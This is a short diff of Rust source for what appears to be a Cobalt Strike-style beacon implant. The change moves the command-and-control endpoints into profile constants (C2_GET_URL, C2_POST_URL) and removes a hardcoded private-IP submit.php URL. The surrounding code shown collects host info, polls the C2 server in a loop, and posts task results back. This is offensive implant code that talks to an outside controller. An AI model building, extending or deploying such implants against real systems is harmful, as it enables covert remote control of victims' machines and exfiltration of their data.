@@ -29,7 +29,7 @@ mod crypt;
 mod profile;
 mod utils;
 use crypt::*;
-use profile::{C2_URL, PUB_KEY, USER_AGENT};
+use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
 use utils::*;
 
 const CMD_TYPE_SLEEP: u32 = 4;
@@ -158,9 +158,9 @@ impl Beacon {
 fn main() {
     let beacon = Beacon::init();
     let cookie = beacon.collect_info().expect("collect info error");
-    println!("starting connect to {}", C2_URL);
+    println!("starting connect to {}", C2_GET_URL);
     loop {
-        let http_res = Strike::http_get(C2_URL, &cookie, USER_AGENT);
+        let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
         if let Ok(res) = http_res {
             let content_length = res.content_length().unwrap() as usize;
             // continue;
@@ -222,7 +222,7 @@ fn main() {
                         hexdump::hexdump(&raw_pkg)
                     );
                     println!("buf, len:{}, data:{:?}", buf.len(), hexdump::hexdump(&buf));
-                    let url = format!("http://192.168.1.106:8080/submit.php?id={}", beacon.id);
+                    let url = format!("{}{}", C2_POST_URL, beacon.id);
                     let post_res = Strike::http_post(&url, "", "", buf);
                     dbg!(post_res);
                 } else {
